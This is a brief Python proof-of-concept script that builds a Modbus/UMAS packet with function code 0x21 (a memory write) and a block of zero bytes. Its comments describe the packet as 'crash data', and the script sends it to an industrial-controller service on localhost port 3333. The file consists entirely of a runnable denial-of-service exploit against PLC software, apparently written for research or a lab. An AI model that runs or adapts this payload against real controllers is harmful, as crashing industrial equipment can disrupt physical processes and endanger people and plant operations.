#!/usr/bin/env python3
import socket

def main():
    # target definition setup
    rhost = "127.0.0.1"
    rport = 3333

    # socket setup
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    # umas params
    mbap         = "\x00\x00\x00\x00\x00\x97\x00\x5a"
    session      = "\x00"
    umas_fnc     = "\x21"
    unknown      = "\x00"
    block_number = "\x10\x00"
    offset       = "\x00\x00\x50\x00"
    size         = "\x8a\x00"
    data         = "\x00" * 0x8a
    msg = "%s%s%s%s%s%s%s%s" % (mbap, session, umas_fnc, unknown, block_number, offset, size, data)

    # send crash data
    try:
        s.connect((rhost, rport))
        s.send(msg.encode())
        s.recv(1024)
    except socket.timeout:
        pass
    s.close()

if __name__ == '__main__':
    main()
